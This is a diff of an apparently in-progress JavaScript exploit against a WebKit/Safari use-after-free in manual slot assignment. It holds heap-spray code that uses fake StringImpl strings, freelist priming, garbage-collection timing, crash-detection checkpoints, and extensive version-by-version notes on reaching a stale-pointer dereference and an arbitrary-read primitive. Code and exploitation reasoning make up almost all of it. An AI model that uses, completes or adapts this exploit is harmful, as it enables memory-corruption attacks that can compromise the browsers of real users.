-        // Each call changes slot assignment → slotManualAssignmentDidChange fires
-        // → m_slots.ensure(removed_child) + m_slots.ensure(added_child) = 2 ops/call.
-        // IMPORTANT: slotchange will fire during PUMP too (each assign changes assignment).
-        // We use an injection flag RESET before the final assign to detect only the UAF.
+        const scBeforePump = c.getSlotchangeTotal(); // v26: was _slotchangeTotal (ReferenceError — outside closure)
         for (let i = 0; i < pumpCount; i++) {
-          // Alternate to guarantee a change each call (same-child assign is a no-op)
           targetSlot.assign(i % 2 === 0 ? childA : childB);
         }
-        // After pump, targetSlot is assigned to childA (even) or childB (odd pumpCount)
+        const scDuringPump = c.getSlotchangeTotal() - scBeforePump; // v26: fix scope
 
-        // ── Final trigger: fresh child, slotchange handler will spray into freed slot ──
-        // Reset the injection flag so we can detect if THIS assign triggers injection
-        // (handler always runs, but we want to know if cleanup fires THIS call)
+        // ── Final trigger ──
         const newChild = host.appendChild(document.createElement('span'));
+        const scBeforeTrigger = c.getSlotchangeTotal(); // v26: fix scope
 
-        // assign(newChild):
-        //   pumpCount ops already done → next ensure() crosses cleanup threshold
-        //   → amortized cleanup iterates dead ghost entries → shrink/rehash
-        //   → frees OLD bucket array
-        //   → slotchange fires (synchronously) → our handler allocates 512×freedSz bufs
-        //   → stale effectiveCurrent ptr dereference (into our zeros spray = safe)
+        armTrigger(); // arm injection gate right before final assign
         targetSlot.assign(newChild);
+
+        // v24 FIX: slotchange is ASYNC microtask in safari-7625.1.29.11.
+        // isInjected() was always 0 because we checked BEFORE microtasks drained.
+        // Fix: await setTimeout(0) to flush microtask queue before checking injection.
+        await new Promise(r => setTimeout(r, 0));
         const injectedThisCall = isInjected();
+        const scAfterTrigger = c.getSlotchangeTotal() - scBeforeTrigger; // v26: fix scope
+
+        if (scDuringPump !== pumpCount || scAfterTrigger < 1)
+          log(`[DIAG] g=${ghosts} pump sc=${scDuringPump}/${pumpCount} trigger sc=${scAfterTrigger} injected=${injectedThisCall}`);
 
         // ── Check for stale-read anomaly ──
         const nodes = targetSlot.assignedNodes({ flatten: false });
@@ -1332,7 +2048,7 @@ function checkNodeLeak(nodes, expectedNode) {
           if (clobberLog.length < 20)
             clobberLog.push({ type: 'injection', sz, pumpCount, ghosts,
                               anomaly: !!anomaly,
-                              poolSize: (getPool()||[]).length });
+                              strCount: (getStrings()||[]).length });
         }
 
       } catch (e) {
@@ -1347,7 +2063,254 @@ function checkNodeLeak(nodes, expectedNode) {
       log(`[!!!] Freed=${sz}B: injections=${classInjections} exceptions=${classExceptions}`);
   }
 
-  const elapsed = (performance.now() - t0).toFixed(1);
+  elapsed = (performance.now() - t0).toFixed(1);
+
+  // ─── Phase 4.75: v28 — Immediate traversal probe on already-injected cases ───
+  //
+  // ROOT CAUSE of P6B all-"injected=false":
+  //   P6B built FRESH uafSetup() per probe, never waited for GC → ghosts alive →
+  //   WeakPtrs never null → amortizedCleanup never fired → injection gate never opened.
+  //
+  // ROOT CAUSE of no anomaly even when injection fires:
+  //   After SHRINK, WebKit frees OLD bucket and allocates NEW smaller bucket.
+  //   Our injection fills OLD freed bucket with fake StringImpl strings.
+  //   WebKit's m_buckets pointer is now the NEW bucket → traversal reads from NEW
+  //   bucket → never touches fake data in OLD freed memory → no anomaly.
+  //
+  // v28 FIX — TWO-PATH APPROACH:
+  //   Path A (immediate): Directly after Phase 4 injection fires, call
+  //     c.targetSlot.assignedNodes() on the injected case. At this point:
+  //     - The injection strings (c.getStrings()) are still alive (held by injectionStrings)
+  //     - The freed bucket memory is OCCUPIED by our fake StringImpl data
+  //     - The NEW bucket is what m_buckets points to (small, correct)
+  //     - assignedNodes() reads m_assignedNodes (direct array), NOT m_buckets
+  //       → so anomaly via this path requires stale m_assignedNodes ptr or similar
+  //     We check: does assignedNodes() return wrong node count / wrong identity?
+  //     AND: does the call throw? (if freed bucket read before new bucket set up)
+  //
+  //   Path B (re-trigger): After injection fires, do ONE MORE assign() on the
+  //     same case. This forces another slotManualAssignmentDidChange() call.
+  //     If the NEW bucket now has our injected data (possible if injection handler
+  //     ran AFTER new bucket was set but BEFORE m_buckets pointer was updated),
+  //     this second assign() traversal would hit fake data → crash or anomaly.
+  //     If this crashes: KERN_INVALID_ADDRESS → WebContent kill → reload → [HIT]
+  //
+  //   We try Path A first (non-destructive), then Path B (may crash process).
+  //   Both run only on cases where isInjected()=true.
+  //
+  // NOTE ON OLD vs NEW BUCKET TIMING:
+  //   The exact moment injection fires (synchronously inside slotManualAssignmentDidChange)
+  //   is AFTER bucket free() but the m_buckets update hasn't necessarily happened yet.
+  //   The injection handler fills the JUST-freed memory. Then the rehash code sets
+  //   m_buckets = newBucket. So the old bucket ptr IS stale but m_buckets already
+  //   moved on. However: if the injection strings occupied the NEW bucket's allocation
+  //   (new bucket is SMALLER → different size class → different free-list → unlikely),
+  //   or if timing caused a race where the inject strings were allocated between
+  //   free(oldBucket) and malloc(newBucket), the new bucket might alias injection data.
+  //   We test this by checking what assignedNodes() returns post-injection.
+  //
+  log('\n[*] Phase 4.75: v28 — Immediate probe on injected cases (old/new bucket traversal test)');
+
+  let p475_anomalies = 0;
+  let p475_exceptions = 0;
+  let p475_probed = 0;
+  const p475_log = [];
+
+  const injectedCases = allCases.filter(c => c.isInjected());
+  log(`[P4.75] injectedCases=${injectedCases.length}/${allCases.length}`);
+
+  for (const c of injectedCases) {
+    p475_probed++;
+    const { targetSlot, host, childA, childB, freedSz, ghosts } = c;
+    const injStrs = c.getStrings();
+
+    // Path A: read assignedNodes() while injection strings still alive
+    try {
+      const nodes_a = targetSlot.assignedNodes({ flatten: false });
+      const anomaly_a = nodes_a.length === 0 || nodes_a.some(n => n === undefined || n === null);
+      if (anomaly_a) {
+        p475_anomalies++;
+        p475_log.push(`PATH-A anomaly: freedSz=${freedSz} g=${ghosts} nodeLen=${nodes_a.length}`);
+        log(`[P4.75] PATH-A ANOMALY: freedSz=${freedSz}B g=${ghosts} nodeLen=${nodes_a.length}`);
+      } else {
+        log(`[P4.75] Path A: freedSz=${freedSz}B g=${ghosts} nodes=${nodes_a.length} OK (no anomaly)`);
+      }
+    } catch(e) {
+      p475_exceptions++;
+      p475_log.push(`PATH-A exception: freedSz=${freedSz} g=${ghosts} err=${e.message||e}`);
+      log(`[P4.75] PATH-A EXCEPTION (freedSz=${freedSz}B g=${ghosts}): ${e.message||e}`);
+    }
+
+    // Path B: re-trigger assign() — forces new traversal into (possibly stale) bucket
+    // v31: pump opCount on the new bucket to push past amortizedCleanup threshold.
+    // Each assign() increments opCount. amortizedCleanup fires when opCount > ~2N (N=bucket entries).
+    // New bucket after SHRINK has capacity=pumpCount, so ~2*pumpCount ops needed.
+    // We pump 64 extra assigns on the new bucket to guarantee cleanup fires.
+    // amortizedCleanup then iterates new bucket entries, checks isLive() on each WeakImpl,
+    // deref's key if isLive() → fake StringImpl m_hash ≠ 0 (v31 fix) → isLive=true → KERN_INVALID_ADDRESS.
+    try {
+      localStorage.setItem('p475_crash', JSON.stringify({
+        path: 'B', freedSz, ghosts, ts: Date.now(), injStrCount: (injStrs||[]).length
+      }));
+    } catch(_) {}
+
+    try {
+      // v31: pump 64 extra assigns to push opCount > amortizedCleanup threshold on new bucket
+      const _pumpChild = host.appendChild(document.createElement('span'));
+      for (let _p = 0; _p < 64; _p++) {
+        targetSlot.assign(_p % 2 === 0 ? childA : childB);
+      }
+      await new Promise(r => setTimeout(r, 0));
+      // Final assign — amortizedCleanup should now fire and deref fake key in new bucket
+      // If m_buckets → new bucket → our injected fake StringImpl → key deref → crash
+      targetSlot.assign(childA);
+      await new Promise(r => setTimeout(r, 0));
+      const nodes_b = targetSlot.assignedNodes({ flatten: false });
+      const anomaly_b = nodes_b.length === 0 || nodes_b.some(n => n === undefined || n === null)
+                        || (nodes_b.length > 0 && nodes_b[0] !== childA);
+      if (anomaly_b) {
+        p475_anomalies++;
+        p475_log.push(`PATH-B anomaly: freedSz=${freedSz} g=${ghosts} nodeLen=${nodes_b.length} node0=${nodes_b[0]===childA?'childA':'WRONG'}`);
+        log(`[P4.75] PATH-B ANOMALY: freedSz=${freedSz}B g=${ghosts} nodeLen=${nodes_b.length} node0=${nodes_b[0]===childA?'childA':'WRONG'}`);
+      } else {
+        log(`[P4.75] Path B: freedSz=${freedSz}B g=${ghosts} survived assign → nodes=${nodes_b.length} node0=${nodes_b.length>0?(nodes_b[0]===childA?'childA':'WRONG'):'n/a'}`);
+      }
+      try { localStorage.removeItem('p475_crash'); } catch(_) {}
+    } catch(e) {
+      p475_exceptions++;
+      p475_log.push(`PATH-B exception: freedSz=${freedSz} g=${ghosts} err=${e.message||e}`);
+      log(`[P4.75] PATH-B EXCEPTION (freedSz=${freedSz}B g=${ghosts}): ${e.message||e}`);
+      try { localStorage.removeItem('p475_crash'); } catch(_) {}
+    }
+  }
+
+  // Check if a prior run crashed in Phase 4.75
+  try {
+    const p475crash = JSON.parse(localStorage.getItem('p475_crash') || 'null');
+    if (p475crash) {
+      log(`[P4.75] ✓ PRIOR RUN CRASHED in Phase 4.75 Path ${p475crash.path}!`);
+      log(`[P4.75]   freedSz=${p475crash.freedSz}B g=${p475crash.ghosts} injStrCount=${p475crash.injStrCount}`);
+      log(`[P4.75]   → THIS IS THE SIGNAL: fake StringImpl deref killed WebContent`);
+      log(`[P4.75]   → UAF + arb-crash confirmed. Check Analytics for KERN_INVALID_ADDRESS.`);
+      localStorage.removeItem('p475_crash');
+    }
+  } catch(_) {}
+
+  if (p475_anomalies > 0) {
+    log(`\n[!!!] P4.75 ANOMALY: ${p475_anomalies} cases produced wrong assignedNodes result`);
+    log('[!!!] Stale bucket traversal hit fake StringImpl → arb-read signal');
+    p475_log.forEach(l => log(`[!!!]   ${l}`));
+  } else if (p475_exceptions > 0) {
+    log(`\n[P4.75] ${p475_exceptions} JS exceptions during re-trigger (possible corruption signal)`);
+  } else {
+    log(`[P4.75] All ${p475_probed} injected cases: no anomaly, no exception`);
+    log('[P4.75] → New bucket is clean, old freed bucket not traversed via these paths');
+    log('[P4.75] → If no crash (process survived), then new bucket replacement was clean');
+    log('[P4.75] → Next: look at fake StringImpl key value to confirm it hits unmapped range');
+  }
+
+  // ─── Phase 4.76: v29 — flatten:true traversal probe on injected cases ──────────
+  // flatten:false confirmed no deref of fake key (P4.75 all survived).
+  // flatten:true triggers different internal traversal — may walk distributed-slot path
+  // that touches the WeakHashMap key pointer differently.
+  // Also: host.cloneNode(true) — ManualSlotAssignment copy constructs new m_slots from old.
+  log('\n[*] Phase 4.76: v29 — flatten:true + cloneNode traversal probes on injected cases');
+  let p476_anomalies = 0, p476_exceptions = 0, p476_clone_exceptions = 0;
+  const injectedCases476 = allCases.filter(c => c.isInjected());
+  log(`[P4.76] injectedCases=${injectedCases476.length}`);
+
+  for (const c of injectedCases476) {
+    const { targetSlot, host, childA, freedSz, ghosts } = c;
+
+    // Path C: flatten:true
+    try {
+      const nodes_flat = targetSlot.assignedNodes({ flatten: true });
+      const anomaly_flat = nodes_flat.length === 0 || nodes_flat.some(n => !n);
+      if (anomaly_flat) {
+        p476_anomalies++;
+        log(`[P4.76] ⚠ PATH C ANOMALY flatten=true: freedSz=${freedSz}B g=${ghosts} nodes=${nodes_flat.length}`);
+      } else {
+        log(`[P4.76] Path C OK flatten=true: freedSz=${freedSz}B g=${ghosts} nodes=${nodes_flat.length}`);
+      }
+    } catch(e) {
+      p476_exceptions++;
+      log(`[P4.76] ⚠ PATH C EXCEPTION flatten=true: freedSz=${freedSz}B g=${ghosts}: ${e.message||e}`);
+    }
+
+    // Path D: cloneNode — ManualSlotAssignment copy-constructor touches m_slots
+    try {
+      localStorage.setItem('p476_clone_crash', JSON.stringify({ freedSz, ghosts, ts: Date.now() }));
+      const hostClone = host.cloneNode(true);
+      document.body.appendChild(hostClone);
+      await new Promise(r => setTimeout(r, 0));
+      const clonedSlots = hostClone.querySelectorAll('slot');
+      log(`[P4.76] Path D cloneNode OK: freedSz=${freedSz}B clonedSlots=${clonedSlots.length}`);
+      hostClone.remove();
+      try { localStorage.removeItem('p476_clone_crash'); } catch(_) {}
+    } catch(e) {
+      p476_clone_exceptions++;
+      log(`[P4.76] ⚠ PATH D EXCEPTION cloneNode: freedSz=${freedSz}B g=${ghosts}: ${e.message||e}`);
+    }
+  }
+
+  if (p476_anomalies > 0) {
+    log(`\n[!!!] P4.76 ANOMALY: ${p476_anomalies} cases — flatten:true hit stale path!`);
+  } else if (p476_exceptions + p476_clone_exceptions > 0) {
+    log(`\n[P4.76] Exceptions: flatten=${p476_exceptions} clone=${p476_clone_exceptions} — possible corruption`);
+  } else {
+    log(`[P4.76] All clean: no anomaly, no exception (flatten:true + cloneNode)`);
+  }
+
+  // ─── Phase 4.5: v13 diagnostic — StringImpl FLOOD spray (4096/slotchange) ──────
+  // v12 confirmed StringImpl in FastMalloc but ALL NO-CRASH (31/31).
+  // Root cause: engine-internal allocations competed for the freed slot before our
+  //   64-string injection could land. v12 injection count (64) was too small.
+  // v13 fix: FLOOD injection — 4096 strings per slotchange + 512 pre-prime (up from 128).
+  //   4096 × 512B = 2MB of FastMalloc pressure per trigger → drowns competing allocs.
+  //   StringImpl.key = u64(1 | charCount<<32) = 0x1F000000001 (for charCount=496)
+  //   0x1F000000001 = ~128GB → above dyld (~10GB), below Gigacage (~128TB) → UNMAPPED
+  //   → KERN_INVALID_ADDRESS → WebContent kill → reload → [P6B HIT]
+  log('\n[*] Phase 4.5: v33 StringImpl FLOOD spray diagnostic');
+  log('[*]   spray type: WTF::StringImpl strings (WTF::fastMalloc — same heap as bucket arrays)');
+  log('[*]   v31 fix: m_hash≠0 on primed strings → isLive()=true → amortizedCleanup deref\'s key → crash');
+  log('[*]   v31 fix: 64-pump opCount burst in P4.75-B + P6B per probe → guarantees amortizedCleanup fires');
+  log('[*]   v31 fix: double GC tick before trigger → primed slots actually on bmalloc LIFO');
+  log('[*]   v32 fix: forceHashAndRelease moved to global scope → Phase 4 pre-spray no longer throws ReferenceError → injection fires');
+  log('[*]   v33 fix: P6B ghost-fill+drain+re-spray (m_hash=0) → BROKEN: host detached, single-elem assign, wrong polarity');
+  log('[*]   v34 fix: (1) re-attach host before P6B probe, (2) variadic assign(...fillElems) to fill bucket, (3) m_hash≠0 via forceHashAndRelease → STILL NO-CRASH');
+  log('[*]   v34 root cause: assign() always calls clearManuallyAssignedNodes() first → wipes opCount+dead entries → amortizedCleanup can never see dead fake entries → crash window is ONLY during Phase 4 SHRINK traversal, not re-triggerable on stale cases');
+  log('[*]   v35 fix: P6B builds FRESH uafSetup() pool (1 case × N P6B probes) + batch GC → each probe is its own Phase 4 trigger → amortizedCleanup fires on fresh dead bucket → deref fake StringImpl → KERN_INVALID_ADDRESS');
+  log('[*]   v35 root cause (ALL NO-CRASH): primeHalfFreelist() called in probe loop took the 512B LIFO slot that SHRINK uses for its clean new bucket. SHRINK got our fake StringImpl as new bucket → hash table ran on garbage-filled new bucket → effectiveCurrent deref path broken. P6A (confirmed crashing) never calls primeHalfFreelist.');
+  log('[*]   v36 fix: REMOVE primeHalfFreelist() from P6B probe loop. SHRINK now gets a clean new 512B bucket. Old 1024B bucket freed. slotchange wave1 spray (4096×1008char) reclaims freed old bucket. Deferred effectiveCurrent deref reads fake WeakPtrImpl* → KERN_INVALID_ADDRESS. Also adds extra GC round (matches P6A two-round GC pattern).');
+  log('[*]   v36 root cause (ALL NO-CRASH): releaseGhosts() triggers amortizedCleanup at opCount=32 WHILE ghosts still alive → 0 dead → no SHRINK → opCount reset to 0. Only 2 re-add ensures happen after → opCount=2 when P6B probe runs. probe assign(childA) → +3 ops → opCount=5. Never crosses 32. amortizedCleanup never fires. No SHRINK. No UAF window.');
+  log('[*]   v37 fix: Add pump loop of 14× before armTrigger in P6B probe. 14 pumps × 2 ops = 28 ops. opCount: 2 → 30. Then armTrigger. Then assign(childA) → +2 → opCount=32 → amortizedCleanup fires WITH 28 dead ghost WeakPtrs → SHRINK → old 1024B bucket freed → wave1 spray reclaims → effectiveCurrent UAF → KERN_INVALID_ADDRESS.');
+  log('[*]   v37 root cause (ALL NO-CRASH): _p6bPumpCount=14 was WRONG. 14 pumps × 2 ops = 28 ops added to opCount=2 → 30. But pumpCount from uafSetup is 3 (pumpCountForGhosts(28)=3). Phase 4 DIAG: "pump sc=0/3 trigger sc=1". The 14-pump loop overshoots: SHRINK fires mid-loop (at pump 15, opCount=32) while armTrigger NOT yet called → gate closed → spray does not reclaim → effectiveCurrent UAF is unexploitable. After SHRINK mid-pump, opCount resets to 0, remaining pumps and trigger can never cross threshold again.');
+  log('[*]   v38 fix: Change _p6bPumpCount=14 → _p6bPumpCount=_pumpCount (=3 from uafSetup). Matches Phase 4 / P6A exact pattern exactly. armTrigger called AFTER 3 pumps. Final assign(newChild) → SHRINK fires → gate open → wave1 spray reclaims old 1024B bucket → effectiveCurrent is fake StringImpl in controlled spray buffer → deref ptr+8 → KERN_INVALID_ADDRESS.');
+  log('[*]   v38 root cause (ALL NO-CRASH): TWO compounding bugs. (1) primeHalfFreelist removed in v36 — without it SHRINK always gets a clean 512B bucket, m_slots is valid forever, no crash is ever possible regardless of opCount. (2) pump-before-arm ordering means SHRINK fires at pump 2 with gate STILL CLOSED → unusable. opCount resets, final assign opCount=4 < 32 → no second SHRINK → slotchange fires (gate open) → injected=true but no poisoned m_slots → no crash.');
+  log('[*]   v39 fix: Restore primeHalfFreelist() call BEFORE armTrigger() in P6B probe. primeHalfFreelist puts fake 512B StringImpl on LIFO freelist top. armTrigger then opens gate. pump 3× → at pump 2 opCount 29+4=33>32 → SHRINK fires WITH gate open → malloc(512B) returns our fake StringImpl as newBucket → m_slots = fakeStringImpl (POISONED). Subsequent WeakHashMap access deref fakeString bytes as bucket entry key → KERN_INVALID_ADDRESS. Phase 4 exact pattern restored.');
+  log('[*]   v39 root cause (ALL NO-CRASH): primeHalfFreelist() return value discarded (_pc.primeHalfFreelist() with no assignment). forceHashAndRelease() clears its own tmp map but the returned primed[] array STILL holds live JS refs to all strings. With live refs, bmalloc refCount > 0 → strings NOT freed → NOT on LIFO freelist → SHRINK malloc(512B) gets a different clean slot. Fix: capture return + null immediately (let p = _pc.primeHalfFreelist(); p = null) matches Phase 4 exact pattern (primedHalfStrings=null).');
+  log('[*]   v39b fix: Capture primeHalfFreelist() return value and immediately null it. This drops the last JS reference → StringImpl refCounts fall to 0 → bmalloc frees them synchronously → they land on LIFO 512B freelist top. SHRINK malloc(512B) returns our fake StringImpl. m_slots = fakeStringImpl (POISONED). ensure() on next assign deref fakeString bytes → KERN_INVALID_ADDRESS.');
+  log('[*]   v39b root cause (ALL NO-CRASH): SHRINK fires correctly at pump 2, opCount resets to 0, m_slots=fakeStringImpl (POISONED). But crash requires amortizedCleanup TRAVERSAL (not ensure() insert). ensure() does pointer comparison only — no deref. Only traversal does entry.key->m_weakValueCount. After SHRINK reset: pump3 (+2) + final assign (+2) = 4 ops total. New bucket cap=32 → new threshold=16. opCount=4 < 16 → 2nd amortizedCleanup NEVER fires → no traversal → no deref of fake key → no crash. injected=true only proves slotchange fired, not that traversal ran.');
+  log('[*]   v40 fix: Add 8 bonus pumps after the main pumpCount loop. After SHRINK (opCount reset to 0): pump3 adds +2=2. 8 bonus pumps add +16=18. opCount=18 > threshold=16 → 2nd amortizedCleanup fires → TRAVERSAL of fakeStringImpl bucket → slot[0].key = 0x000001F000000001 (u64: refCount=1 | charCount<<32, charCount=496=0x1F0) → deref → unmapped arm64 VA → KERN_INVALID_ADDRESS → WebContent crash → page reload → P6B HIT.');
+  log('[*]   v40 root cause (ALL NO-CRASH): The entire v35-v40 "fakeStringImpl new bucket → traversal crash" path is fundamentally broken. When SHRINK calls malloc(512B) and gets our primed StringImpl, SHRINK immediately writes WeakHashMap entry data (copies live entries) into it. The StringImpl bytes are overwritten before any traversal can occur. m_slots points to properly initialized bucket data. No traversal of fake bytes ever happens. Additionally: bmalloc overwrites bytes[0..7] of any freed block with a freelist next-ptr, so even if somehow traversal ran, slot[0].key = mapped bmalloc heap ptr (not unmapped VA) → no crash. The entire primeHalfFreelist crash strategy is impossible by design.');
+  log('[*]   v41 fix: COMPLETELY REDESIGN P6B to use the CORRECT crash path — mirror Phase 4 exactly. REMOVE primeHalfFreelist from probe (SHRINK new bucket is always overwritten by WebKit, we cannot poison it). KEEP armTrigger() BEFORE pumps (gate open when SHRINK fires). SHRINK frees OLD 1024B bucket → slotchange handler wave1 spray (4096×1008-char StringImpls, 1024B each, WTF::fastMalloc LIFO) reclaims freed old bucket → effectiveCurrent() stale m_slots ptr reads bucket[0].key = u64(refCount=1|charCount<<32) = 0x3F000000001 → deref unmapped arm64 VA → KERN_INVALID_ADDRESS → page reload → P6B HIT. Crash address is fixed (~0x3F000000001); localStorage checkpoint records which candidate ci was active → confirms UAF fired on that probe.');
+  log('[*]   v43 fix (NO-CRASH): armTrigger BEFORE pumps (gate OPEN during SHRINK -> stale ptr active, NODE-ANOMALY path) + trigger assign AFTER pump loop (wave1 spray queued). At await: ALL microtasks drain -> pump-2 slotchange wave1 spray reclaims freed 1024B oldBucket (LIFO top) -> bucket[0].key=0x3F000000001 -> stale m_slots deref -> KERN_INVALID_ADDRESS. v42 NO-CRASH root cause: gate closed during SHRINK -> spray ran after m_slots updated -> nobody read stale ptr. v41 NODE-ANOMALY confirms stale ptr IS read when gate open during SHRINK. v43: combine both paths.');
+  log('[*]   v44 fix: Add per-probe DIAG (slotchange count at each stage: scBefore/scAfterPump/scAfterTrigger/scAfterAwait) + sync-window assignedNodes test (check for NODE-ANOMALY before await, in sync execution window after pump loop). Identifies whether stale ptr read is sync (during pump C++ execution) or async (after microtask drain). Also adds copy-log button.');
+  log('[*]   v45 fix: Insert sync spray (4096x1008-char StringImpls) in stale window after pump loop. Removes trigger assign (it called clearManuallyAssignedNodes() resetting m_assignedNodes). Freed 1024B oldBucket on LIFO top reclaimed by first spray alloc. assignedNodes() reads stale m_assignedNodes -> 0x3F000000001 -> KERN_INVALID_ADDRESS.');
+  log('[*]   v46 fix: Micro-spray 16B 0-char StringImpls BEFORE pump loop to reclaim freed WeakPtrImpl slots (28 ghosts freed 28 WeakPtrImpl 16B objects). amortizedCleanup traversal at pump-2 threshold crossing: dead entry.key = our 16B spray obj. bytes[0..7]=0x1 -> deref(1) -> KERN_INVALID_ADDRESS. Restore trigger assign + wave1 spray belt+suspenders.');
+  log('[*]   v48 fix: Abandon WeakPtrImpl spray (wrong allocator — JSC GC heap ≠ WTF::fastMalloc). Use stale WeakPtr<Node> in m_assignedNodes directly. v48 confirmed 32/32 syncAnomaly=true — stale node IS returned. But stale node = live childB (releaseGhosts did assign(childA,childB) adding childB to m_assignedNodes). Not a freed object.');
+  log('[*]   v49 fix: Keep ghost[0] in m_assignedNodes by doing assign(childA, ghost[0]) in releaseGhosts. Drop ghost[0] via pump assign(childA). FAIL: m_manuallyAssignedElements kept ghost[0] C++ alive through GC. After GC, ghost[0] JS dead but C++ alive. Pump assign(childA) on already-{childA,ghost[0]} slot → scAfterPump0=2 unchanged. opCount never accumulated. syncAnomaly=false 32/32.');
+  log('[*]   v50 fix: (1) Restore releaseGhosts to assign(childA,childB) — opCount fix. (2) Save _ghost0 before ghostElems.length=0. (3) injectGhostIntoAssignedNodes(): assign(childA,ghost0)+assign(childA) → ghost[0] in m_assignedNodes, NOT m_manuallyAssigned. _ghost0 keeps C++ alive. (4) GC loop (ghost[0] stays alive via _ghost0). (5) Probe: killGhost0() → _ghost0=null → ghost[0] C++ freed → assignedNodes() immediately → stale WeakPtr<Node> → arb-read on freed Node C++.');
+  log('[*]   v50 root cause: assign() ALWAYS calls clearManuallyAssignedNodes() → wipes m_assignedNodes ENTIRELY → ghost[0] WeakPtr<Node> gone immediately after second assign(childA). staleNodeCount=0 32/32. assignedNodes() stale-read path fundamentally impossible via assign() — clearManuallyAssignedNodes() always fires.');
+  log('[*]   v51 fix: ABANDON assignedNodes() stale-read approach. RETURN to Phase 4 / P6A SHRINK injection path (confirmed injection=true 3/3 in v46 P6A). P6B: fresh uafSetup pool, one per candidate. releaseGhosts (no _ghost0, GC target=ALL). primeFreelist drop → 2×tick → armTrigger → pump(pumpCount-1) → tick → assign(childA) trigger → await → check injected. If injected=true: SHRINK fired + wave1 spray ran → effectiveCurrent() stale deref → KERN_INVALID_ADDRESS → WebContent crash → reload → [P6B HIT].');
+  log(`[*]   injections fired: ${totalInjections}/${totalCases}`);
+  log(`[*]   v24 slotchange total: ${allCases.reduce((s,c)=>s+c.getSlotchangeTotal(),0)} (expected ${allCases.reduce((s,c)=>s+c.pumpCount+1,0)})`);
+  log('[*]   StringImpl.key at [0..7]: u64(refCount=1 | charCount<<32) → e.g. 0x1F000000001 → unmapped');
+  log('[*]   StringImpl.m_hash at [8..11]: non-zero after forceStringHash() → isLive()=true');
+  log('[*]   crash path: SHRINK free(oldBucket 1024B) → wave1 spray reclaims → effectiveCurrent() stale deref(bucket[0].key=0x3F000000001) → KERN_INVALID_ADDRESS → WebContent kill → reload → [P6B HIT]');
+  log('[*]   sentinel scan: retired (strings immutable from JS — crash detection is the signal)');
+  } // end if (!_v52RetryState) — phases 3-4 block
+  const sentinelClobbers = 0; // v13: no sentinel scan — crash-based detection only
 
   // ─── Phase 5: Interpret signals → confirm UAF ────────────────────────────
   //
@@ -1358,9 +2321,9 @@ function checkNodeLeak(nodes, expectedNode) {
   //         (necessary but not sufficient — cleanup might run without UAF if
   //          the assign pump crossed threshold but spray timing was off)
   //
-  const hardConfirmed   = uafExceptions > 0;
-  const mediumConfirmed = nodeAnomalies > 0;
-  const softSignal      = totalInjections > 0;
+  hardConfirmed   = uafExceptions > 0;
+  mediumConfirmed = nodeAnomalies > 0 || sentinelClobbers > 0;
+  softSignal      = totalInjections > 0;
   const heapOverlap     = hardConfirmed || mediumConfirmed;
 
   if (hardConfirmed) {
@@ -1368,15 +2331,19 @@ function checkNodeLeak(nodes, expectedNode) {
     log('[!!!] UAF fired and corrupted allocator metadata or adjacent object');
   }
   if (mediumConfirmed) {
-    log(`\n[!!!] MEDIUM CONFIRM: ${nodeAnomalies} anomalies (pattern clobbers + node anomalies)`);
-    log('[!!!] Stale effectiveCurrent ptr wrote into our controlled injection buffer!');
+    log(`\n[!!!] MEDIUM CONFIRM: nodeAnomalies=${nodeAnomalies} sentinelClobbers=${sentinelClobbers}`);
+    log('[!!!] Stale effectiveCurrent ptr reached our controlled injection buffer!');
     nodeAnomalyLog.forEach(l => log(`[!!!]   ${l}`));
   }
   if (softSignal && !heapOverlap) {
-    log(`\n[*] SOFT SIGNAL: ${totalInjections} injections — cleanup fired, fake-WeakImpl spray ran`);
-    log('[*] Fake entries: key=0 (null), m_count=1 (isLive=true) — HARD crash expected if overlap');
-    log('[*] No crash/anomaly yet — stale ptr may still miss the 512-buf window');
-    log('[*] Try: bump injection count to 2048 in uafSetup, or increase ghosts range to 200');
+    log(`\n[*] SOFT SIGNAL: ${totalInjections} injections — cleanup fired, StringImpl spray ran`);
+    log('[*] v13: StringImpl FLOOD (4096/slotchange) in fastMalloc — same heap as WeakHashMap bucket arrays');
+    log('[*] StringImpl.key=[0..7]=u64(1|charCount<<32) → unmapped arm64 VA → crash on deref');
+    log('[*] No JS exception / DOM anomaly here — crash kills the process (uncatchable)');
+    log('[*] IF UAF fires and deref hits our string: WebContent crash → reload → [P6B HIT]');
+    log('[*] No crash in this run → UAF traversal may not have dereffed key this round');
+    log('[*] → Non-deterministic (depends on GC timing, thread scheduling, free-list state)');
+    log('[*] → Try reloading to retry (new GC cycle, fresh free-list state)');
     for (const h of clobberLog.slice(0, 5))
       log(`[*]   ${JSON.stringify(h)}`);
   }
@@ -1459,7 +2426,8 @@ function checkNodeLeak(nodes, expectedNode) {
   // We derive it from T9 fit: rank-0 latency intercept corresponds to alloc[0].
   // For now we log the limitation and still run — all probes will crash, documented.
   // NEXT STEP: derive gigacageBase from T9 heap-rank fit intercept (see log below).
-  if ((hardConfirmed || totalInjections > 0) && sprayHex && sprayHex.length > 0) {
+  // v24: Run Phase 6 unconditionally (was gated on totalInjections>0 which never ran with async slotchange)
+  if (sprayHex && sprayHex.length > 0) {
     log('\n[*] Phase 6: Arb-read primitive — probing oracle candidates...');
     log(`[*] Running on: ${hardConfirmed ? 'HARD confirmed' : 'SOFT signal (injection fired)'}`);
     log(`[*] Testing top ${Math.min(32, sprayHex.length)} HIGH-conf candidates as fake key ptrs`);
@@ -1470,97 +2438,164 @@ function checkNodeLeak(nodes, expectedNode) {
     log('[*]   From T9 intercept (ns_0 from linear fit): rank0_ns → alloc[0] VA = Gigacage start.');
     log('[*]   Provide T9 fit params (slope, intercept) in log → next iteration resolves base.');
 
-    // Pick the best UAF case to reuse: ghosts=20, matching freed size
-    // Rebuild a fresh UAF setup for Phase 6 probing
-    const P6_GHOSTS = 20;
+    // ── Phase 6 entry canary ─────────────────────────────────────────────────
+    log('[P6] ENTRY — v3 confirmed, setting up vars...');
+
+    // GHOSTS=28 → freedSz=1024 → matches SPRAY_SIZES and phase-2 pool
+    // (GHOSTS=200 → freedSz=8192 → outside SPRAY_SIZES → no overlap possible)
+    // v19: changed from 20→28 (20 was invalid: pumpCount=-6, cleanup fires during ghost assign)
+    const P6_GHOSTS = 28;
     const p6FreedSz = freedBucketSizeForGhosts(P6_GHOSTS);
     const p6PumpCount = pumpCountForGhosts(P6_GHOSTS);
     const p6MatchedSz = SPRAY_SIZES.reduce((prev, cur) =>
       Math.abs(cur - p6FreedSz) < Math.abs(prev - p6FreedSz) ? cur : prev);
+    log(`[P6] vars ok — p6FreedSz=${p6FreedSz} p6PumpCount=${p6PumpCount}`);
 
-    // We'll probe each HIGH candidate as the fake key ptr
